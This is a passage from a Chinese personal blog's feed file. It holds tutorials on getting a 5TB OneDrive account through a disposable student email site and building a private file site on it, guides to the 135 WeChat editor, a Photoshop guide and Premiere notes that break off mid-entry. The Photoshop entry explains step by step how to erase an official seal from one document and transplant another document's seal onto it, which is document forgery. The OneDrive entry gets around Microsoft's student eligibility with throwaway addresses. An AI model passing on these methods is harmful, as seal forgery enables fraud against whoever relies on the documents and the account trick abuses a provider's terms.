rel="noopener">蓝奏云下载</a></td><td></td></tr><tr><td>星愿浏览器</td><td>官网描述。大学生都爱用</td><td><a href="https://www.lanzous.com/iase0qd" target="_blank" rel="noopener">蓝走运下载</a></td><td><a href="https://www.twinkstar.com/" target="_blank" rel="noopener">官网</a></td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用OneDrive自建网盘</title>
      <link href="/posts/8509.html"/>
      <url>/posts/8509.html</url>
      
        <content type="html"><![CDATA[<p>很久之前就注册过两个，可实时间一长都基本忘记当时是怎么注册的了，结果今天折腾基于OneDrive搭建私人网盘。结果发现都不会注册账号了。<strong>emm 我自己都看不起自己，真tm菜！</strong></p><blockquote><p>一般个人普通用户是10G的空间，但是通过教育邮箱来注册的话是1T空间，而管理员是可以把这个空间调到5T的。</p><p>如果您是大学生且学校有学生邮箱的，可以使用自己的邮箱来注册。那么问题来了，我书读的少，没有学校教育邮箱，如何获得5TB空间的OneDrive？？？</p></blockquote><p><strong>注意事项：</strong></p><ul><li><p>微软会定期屏蔽一些邮箱地址注册。</p></li><li><p>空间默认为5T，当里面的内容达到4.7T时，可以申请增加容量到25T。</p></li><li><p>至于网盘可以用多久这个谁都不清楚，所以<strong>切勿存放个人敏感文件。防止信息泄露。</strong></p></li></ul><h1 id="申请步骤如下"><a href="#申请步骤如下" class="headerlink" title="申请步骤如下"></a>申请步骤如下</h1><p>一、获取一个学生身份的教育临时邮箱，打开下面网址，复制网页右上角自动生成的邮箱地址，然后保持此网址在线不要关闭。</p><ul><li>临时邮箱：<a href="http://xkx.me/" target="_blank" rel="noopener">xkx.me</a></li></ul><p>点击右上角的编辑图标可以自定义邮箱前缀，</p><p>自定义的前缀请使用<strong>小写字母</strong>，大写字母获取不到验证码。</p><p>二、打开教育版申请地址<a href="https://signup.microsoft.com/signup?sku=student" target="_blank" rel="noopener">https://signup.microsoft.com/signup?sku=student</a> 填入刚刚获取到的邮箱地址，再点“注册”。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329144659.png" alt=""></p><p>返回临时邮箱网页查看验证码，</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329144657.png" alt=""></p><p><strong>创建账户就不再赘述了。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329144709.png" alt=""></p><p>出现邀请页直接跳过。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329144658.png" alt=""></p><p>注册好了，点“下一步”，设置下账户安全设置。（一定要绑定一个可以收邮件的邮箱，方便后找回密码）</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329144703.png" alt=""></p><p>耐心等待OneDirive初始化；</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329144705.png" alt=""></p><p>选择OneDrive</p><p><del>好了，现在已经完成注册了，很简单吧？进去后可以使用在线版的office和5T的云盘了，该全局不带桌面版的office的，只有5T的OneDrive云盘可用。</del></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329144701.png" alt=""></p><p>再次耐心等待，完成身份验证邮箱和安全问题后，进入又一次的配置，</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329144700.png" alt=""></p><p>三、查看储存空间</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329144707.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329144706.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329144708.png" alt=""></p><p><strong>此网盘可以映射到本地电脑。</strong></p><h1 id="搭建私有网盘"><a href="#搭建私有网盘" class="headerlink" title="搭建私有网盘"></a>搭建私有网盘</h1><p>基于OneDrive 5T大空间搭建。嘿嘿嘿，微软服务器在海外可能会限速挂代理、迅雷、IDM理论上可以不限速。</p><ul><li><p>网盘不耗费服务器流量</p></li><li><p>也不占用服务器空间</p></li></ul><p><strong>大概的步骤如下，也不是太难。</strong></p><p>1、首先下载<a href="https://www.lanzous.com/iarvwmh" target="_blank" rel="noopener">网站程序</a></p><p>2、讲程序上传至服务器并且解压。</p><p>3、给config和cache目录777读写权限，访问域名进行安装。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329221855.png" alt=""></p><p>4、获取应用ID和机密。（可能需要登陆账户）</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329221857.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329221852.png" alt=""></p><p><strong>点击快速启动</strong> 获取应用ID</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329221854.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329221859.png" alt=""></p><p>5、绑定账号并且授权，等待跳转安装成功页面；至此就搭建好了。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329221851.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329221856.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329221853.png" alt=""></p><ul><li><p>如果刷新网页上传的文件依然还是不显示，说明需要清除缓存重构。（可以在服务器弄个定时计划。定时执行清除重构）也可以在后台设置。</p></li><li><p>计划任务</p><pre class=" language-powershell"><code class="language-powershell">php <span class="token operator">/</span>www<span class="token operator">/</span>wwwroot<span class="token operator">/</span>ndmiao<span class="token punctuation">.</span>cn<span class="token operator">/</span>one<span class="token punctuation">.</span>php token:refreshphp <span class="token operator">/</span>www<span class="token operator">/</span>wwwroot<span class="token operator">/</span>ndmiao<span class="token punctuation">.</span>cn<span class="token operator">/</span>one<span class="token punctuation">.</span>php cache:refresh</code></pre></li></ul><blockquote><p>可以在线上传文件当然也可以通过OneDrive上传都是同步的；这样就可以随时随地在其它设备下载自己的文件咯。</p><p>相当于网盘映射了公网。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>135编辑器带你玩转『暗黑模式』</title>
      <link href="/posts/22887.html"/>
      <url>/posts/22887.html</url>
      
        <content type="html"><![CDATA[<p>说白了就是黑色模式。</p><p>公众号排版注意事项：</p><ul><li><p>为了适配暗黑模式；图片格式必须为PNG。</p></li><li><p>显示2种颜色的字体：</p><p>操作步骤：</p><p>选中一种喜欢的颜色，将色盘拖至偏黑的地方点击确认即可。</p><p>个人理解的原理：暗黑模式下将偏黑的颜色融入了背景从而实现欺骗视觉（白亮色模式与之相反），呈现出来2种颜色交互的假象。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200327111108.gif" alt=""></p><p>更多技巧还在挖掘，，待更新………</p><p>欢迎大佬指出。</p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>135编辑器入门指南</title>
      <link href="/posts/4561.html"/>
      <url>/posts/4561.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-135编辑器基本介绍、页面布局"><a href="#1-135编辑器基本介绍、页面布局" class="headerlink" title="1.135编辑器基本介绍、页面布局"></a>1.135编辑器基本介绍、页面布局</h1><blockquote><p>整体布局</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164702.png" alt=""></p><blockquote><p>样式展示区</p></blockquote><p>此处为排版素材参考区域，我们可以套用，也能搜索框直接检索。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164703.png" alt=""></p><blockquote><p>素材排版编辑区</p></blockquote><p>顶部工具栏只要是编辑文字所用，和微信公众号里的保持一致。鼠标悬停功能上会告诉你它有什么功能。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164705.png" alt=""></p><blockquote><p>常用功能区</p></blockquote><p>主要辅助排版完成以后的操作。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164704.png" alt=""></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="2-编辑好的文章如何预览"><a href="#2-编辑好的文章如何预览" class="headerlink" title="2. 编辑好的文章如何预览"></a>2. 编辑好的文章如何预览</h1><blockquote><p>两种保存方式</p></blockquote><ul><li><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164708.png" alt=""></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164707.png" alt=""></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164706.png" alt=""></p></li><li><p>预览</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164716.gif" alt=""></p></li></ul><h1 id="3-快速导入其它平台文章到135编辑器？"><a href="#3-快速导入其它平台文章到135编辑器？" class="headerlink" title="3.快速导入其它平台文章到135编辑器？"></a>3.快速导入其它平台文章到135编辑器？</h1><p>想要借鉴优质公众号的文章，直接复制到编辑器会发现样式都已经错位乱码了。</p><blockquote><p>使用导入文章功能</p><p>避免复制出错，无法粘贴的情况。</p></blockquote><ul><li><p>导入文章之前，先复制你需要导入的文件链接。</p></li><li><p>135编辑器支持导入：微信公众号、今日头条、百家号、知乎专栏、QQ看点、一点资讯、新浪看点、凤凰博客、网易号等平台的文章链接。其它平台链接无效。</p></li><li><p>导入速度快慢与文章长短有关。耐心等待即可。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164720.gif" alt=""></p><h1 id="4-如何快速调整文本格式并获取样式"><a href="#4-如何快速调整文本格式并获取样式" class="headerlink" title="4. 如何快速调整文本格式并获取样式"></a>4. 如何快速调整文本格式并获取样式</h1><blockquote><p>排版方式与word大致相同。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164718.gif" alt=""></p><h1 id="5-如何上传、批量删除多张图片"><a href="#5-如何上传、批量删除多张图片" class="headerlink" title="5.如何上传、批量删除多张图片"></a>5.如何上传、批量删除多张图片</h1><blockquote><p>上传限制：</p><p>GIF、PNG格式不得超过2M</p><p>其它格式不超过5M</p><p>所有图文分辨率不超过500W像素。</p></blockquote><h1 id="6-如何生成永久链接"><a href="#6-如何生成永久链接" class="headerlink" title="6.如何生成永久链接"></a>6.如何生成永久链接</h1><blockquote><p>这里需要微信公众号授权</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164711.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164713.gif" alt=""></p><h1 id="7-如何一键保存文章到公众号后台"><a href="#7-如何一键保存文章到公众号后台" class="headerlink" title="7.如何一键保存文章到公众号后台"></a>7.如何一键保存文章到公众号后台</h1><p>微信授权同步好处;</p><ul><li><p>有效避免样式粘贴出现格式/代码错误。</p></li><li><p>动态样式（SVG样式）失效问题。</p></li></ul><blockquote><p>查看授权信息</p></blockquote><ul><li><p>135编辑器：个人中心-授权公众号</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164714.gif" alt=""></p></li><li><p>微信公众号平台：后台添加插件“授权管理”进行查看。</p></li></ul><h1 id="8-如何制作数据表单"><a href="#8-如何制作数据表单" class="headerlink" title="8.如何制作数据表单?"></a>8.如何制作数据表单?</h1><p>媒体人少不了各种数据调研与表单收集，比如产品调研、考试问卷、意见反馈等等。</p><blockquote><p>使用运营工具添加表单</p></blockquote><ul><li><p>运营工具数据表单</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164715.gif" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164719.gif" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164715.gif" alt=""></p></li></ul><h1 id="9-图片、文字如何添加超链接"><a href="#9-图片、文字如何添加超链接" class="headerlink" title="9.图片、文字如何添加超链接"></a>9.图片、文字如何添加超链接</h1><blockquote><p>微信外链规则</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164712.png" alt=""></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326171441.gif" alt=""></p><h1 id="10-文章丢失、被覆盖了如何找回"><a href="#10-文章丢失、被覆盖了如何找回" class="headerlink" title="10.文章丢失、被覆盖了如何找回"></a>10.文章丢失、被覆盖了如何找回</h1><blockquote><p>“云端草稿”恢复</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200326164717.gif" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新技能get√Ps偷梁换柱大法之快速去除公章</title>
      <link href="/posts/63137.html"/>
      <url>/posts/63137.html</url>
      
        <content type="html"><![CDATA[<p>首先呢，故事是这样开始de。</p><p>人家找我要Ps绿色版安装包呗，结果。。。。。奇奇怪怪的知识就增加了。</p><blockquote><p>需求：清除A文档已有公章，扣取B文档的公章；将B文档的公章移植到A文档。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200324164602.jpg" alt=""></p></blockquote><p>慢慢来，不急。</p><p>附上镇楼章<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200324164424.png" alt=""></p><ul><li><p>清除A文档已经有的公章</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200324164603.gif" alt=""></p><p>1、首先选择红通道，点击红通道公章颜色就变得暗淡了；如下图</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200324164600.png" alt=""></p><p>2、CTRL L调出色阶，适当调整使公章彻底消失。如下图</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200324164555.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200324164554.png" alt=""></p><p>3、回到红通道，按住ctrl键的同时鼠标左键点击红色通道缩略图；选中选区。</p><p>ctrl c复制选区 </p><p>接着回到RGB通道  </p><p>ctrl v粘贴选区。</p><p>这个时候，公章就已经完全去除了。</p><p>如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200324164557.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200324164556.png" alt=""></p><p>4、接着回到图层，直接拖入我们准备好的公章即可<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200324164424.png" alt=""></p><p>建议新建透明图层，在拖入素材（图层才是PS的灵魂）</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200324164559.png" alt=""></p></li><li><p>扣取B文档的公章</p><p>1、因为颜色不是复杂，我们使用<code>色彩范围</code>可以轻松选取公章并抠出。</p><p>选择—色彩范围。如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200324164558.png" alt=""></p><p><strong>出现扣取的公章</strong> 可以调整<code>颜色容差</code> 进行扩大选取范围，。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200324164601.png" alt=""></p></li><li><p>最终效果：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200324164559.png" alt=""></p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 平面设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Premiere2020学习笔记</title>
      <link href="/posts/49796.html"/>
      <url>/posts/49796.html</url>
      
        <content type="html"><![CDATA[<h1 id="唯有技术-改变命运"><a href="#唯有技术-改变命运" class="headerlink" title="唯有技术 改变命运"></a>唯有技术 改变命运</h1><p>慢慢来，不慌不忙</p><p>一、新建项目和面板介绍：</p><p>点击新建按钮-弹出对话框设置名称-设置存储路径。</p><p>三个选项基本上默认就行。</p><p>常规：GPU加速</p><p>暂存盘：默认即可</p><p>收录设置：默认</p><p>最后直接点击确定即可。</p><p>面板介绍：</p><p>文件=新建-序列：</p><p>新建序列选择AVCHD-1080p25方形像素（不唯一，按需选择）</p><p>将素材拖入序列会弹出是否更改序列对话框，我们选择保持现有序列即可。</p><ul><li>视频素材没有声音解决方案：编辑-首选项-音频硬件-默认输入选择无输入即可。</li></ul><p>二、时间轴面板</p><p>1、“A”：表示对应音频轨道</p><p>2、“V”：表示对应视频轨道</p><p>3、“M”：表示对应轨道静音。</p><p>4、眼睛图标：如果我们点击它是不可视的。</p><p>5、挂锁图标：防止不必要修改。锁定轨道；此时这条轨道的所有素材处于不可编辑状态。</p><p>6、“取消链接”：右键选中视频，取消链接。这样视频和音频就是分开的。可以进行单独 修修剪。</p><p>7、选择工具：</p><p>8、选择：可以选中对象，进行编辑。</p><p>9、前/后选择工具：以鼠标位置为准，向前/后 进行选择；按住Shfit键可对单个轨道进行选择。</p><p>10、波纹修剪工具：对素材进行拖动，前后素材是紧密跟进的；中间没有缝隙。拖动某一段素材的时候，是不会影响到其他素材时间长度的。</p><p>11、滚动编辑工具：两个素材之间拖动，两个素材的时间长度一个变长，一个变短。</p><p>12、比率拉伸工具：调整素材的速度，也叫做持续时间。说白了也就是视频的播放速度；；也可以选中素材点击右键-选择剪辑速度/持续时间，进行视频速度的调整。结果是一样的。</p><p>13、剃刀工具：可以将素材随意切割。</p><p>14、内/外滑工具：对视频的入点和出点进行微调的工具。</p><p>15、外滑工具：不改变时间的长短，只改变素材本身的入点和出点；他的调整不会影响到相邻素材的变化。</p><p>16、内滑工具：与之相反，素材本身的时间段出入点不会改变；左右滑动会使相邻素材发生变化。</p><p>17、钢笔工具：控制关键帧，；钢笔工具新加了一个功能，在视频上可以绘制图形。</p><p>18、抓手缩放工具：可以直接拉动轨道下边的时间条，进行放大移动；手型工具可以移动我们的时间轴。放大工具可以对时间轴进行放大或者缩小。</p><p>19、文字工具：用来制作字幕添加文件等功能。可以再序列监视器建立文字图层，录入文字。</p><p>啥都不会，你还睡得着？？</p><p>三、文字字幕的制作</p><p>创建字幕的方法：</p><p>1、新建-旧版标题（会弹出一个文字编辑对话框）；</p><p>2、就是直在点击文件面板，点击素材录入文字，这个时候我们会发现多出了一个文字的图层，接着效果控件面板中可以修改文字的属性。</p><p>3、窗口-基本图形-右侧弹出基本图形的面板，选择编辑，点击新建图层的图标-点击文本-节目监视器中会多一个图层。</p><p>四：基本图形文字的使用</p><p>1、在菜单栏“窗口”菜单栏中打开“基本图形”面板，选择工具栏”文字工具“输入文字；点击”新建图层“图标，新建 矩形图层。调整矩形的大小并且居中对齐，同样文字也居中对齐，把矩形图层拖动到文字下方，重新修改成自己想要的文字，，当文字很多时候，矩形不会同步变宽是固定大小不变的需要手动去修改。</p><p>2、选中矩形背景框固定到文字图层，并在右侧方形图标上点击中心（进行上下左右固定）当我们再次修改文字这时背景就会岁文字多少而变化。</p><p>3、编辑框内点击空白处，取消选中图层；会出现一个滚动选项；可以使字体上、下滚动。</p><p>五：效果与转场过渡</p><p>1、我们将视频过渡效果拖到两个素材之间，素材的左上角和右上角的小三角形表示“素材已经是最大长度了”；；；当视频长度最大时就不能添加过滤特效，在添加效果的时候会提示“媒体不足，此过渡将包含重复的帧”将素材的长度变短我们再次加入过渡的时候就不会有提示了。</p><p>2、效果的“蓝色标记表示默认效果，可以选中自己喜欢的右键点击设置为默认的即可”。</p><p>3、多个视频之间添加转场效果，框选需要添加效果的素材直接按“CTRL D”全部添加默认的过渡效果。</p><p>4、过渡效果可以调整。</p><p>5、添加音频的效果也是一样。万变不离其宗。</p><p>6、视频效果面板：</p><ul><li><p>”运动效果“：是我们最常用的效果，包含位置、缩放、旋转、描点、防闪烁滤镜。</p><p>“fx”标记是开启或关闭效果。</p><p>每个参数前有个秒表图标，说明每个参数都可以添加关键帧；；我们开启秒表素材中添加了关键帧，关键帧可以左右移动，，点击关键帧的左右三角可以跳转到上一帧或者下一帧，；；关闭秒表后所有的关键帧都会被删除。</p><p>视频中除了默认效果，还可以添加自己喜欢的效果；选中效果直接拖入到效果控件中。</p></li><li><p>“不透明度”</p></li><li><p>“时间重映射”</p></li></ul><h1 id="PR上分攻略"><a href="#PR上分攻略" class="headerlink" title="PR上分攻略"></a>PR上分攻略</h1><h3 id="01电子相册案例："><a href="#01电子相册案例：" class="headerlink" title="01电子相册案例："></a>01电子相册案例：</h3><p><del>小试牛刀 ，小小剪辑师。</del></p><h5 id="一、新建项目"><a href="#一、新建项目" class="headerlink" title="一、新建项目"></a>一、新建项目</h5><h5 id="二、调整项目工作区块（恢复工作区：窗口-工作区-重置为保存的布局CTRL-SHIFT-0）"><a href="#二、调整项目工作区块（恢复工作区：窗口-工作区-重置为保存的布局CTRL-SHIFT-0）" class="headerlink" title="二、调整项目工作区块（恢复工作区：窗口-工作区-重置为保存的布局CTRL SHIFT 0）"></a>二、调整项目工作区块（恢复工作区：窗口-工作区-重置为保存的布局CTRL SHIFT 0）</h5><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200315231722.png" alt=""></p><h5 id="三、导入素材："><a href="#三、导入素材：" class="headerlink" title="三、导入素材："></a>三、导入素材：</h5><ul><li><p>在面板空白处双击</p></li><li><p>直接选中素材拖进面板</p><p>点击新建素材箱，将相片、音频、特效分类。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200315231355.png" alt=""></p></li><li><p>选中项目面板（点击一下空白处即可），按一下”~“面板会放大至全屏。适用于其它工作区。</p></li></ul><h5 id="四、新建序列："><a href="#四、新建序列：" class="headerlink" title="四、新建序列："></a>四、新建序列：</h5><ul><li>我就不采用预设序列了，<strong>设置-自定义序列-时基25帧/秒</strong>，帧大小一本都是<strong>1920*1080</strong>（超清的一个分辨率）。像素长宽比非常重要，一定要选择<strong>方形像素</strong> ，场一般选择无场（逐行扫描）。最后给序列改一个名字，点击确定。 这个时候时间轴面板就加载了序列，与此同时项目面板中也增加一个序列。</li><li><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316003406.png" alt=""></li></ul><h5 id="五、时间轴："><a href="#五、时间轴：" class="headerlink" title="五、时间轴："></a>五、时间轴：</h5><ul><li><p>选中全部相片以及音乐都拉到时间轴上，按住<strong>ALT + 滚轮</strong> 可以放大面板进行调整。在英文状态下按<strong>/</strong> 键面板会自动调整到合适的大小。 <del>可以将素材随意在时间轴上拖动，放在不同的轨道上，多个素材也可以叠加到同一个时间点的</del> 需要注意的是<strong>视频相片素材</strong>只能拖到<strong>V轨道</strong> ； <strong>音频</strong>只能拖到<strong>A轨道</strong>。</p><ul><li><p>时间轴面板功能：</p><ul><li><p>左上角的时间：表示当前指针所在的时间点。可以对其更改快速定位到我们所需的时间点。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316003442.png" alt=""></p></li><li><p>嵌套图标：<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316003501.png" alt=""></p></li><li><p>磁铁图标对其工具：一般情况下都是默认点亮状态（蓝色点亮、灰色不点亮）会自动吸附对齐不同轨道的素材。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316003523.png" alt=""></p></li><li><p>链接选择项：点亮状态会同时选择视频对应音频；不点亮状态选择视频 不会选择到音频（选择音频与之相反）</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200316003541.png" 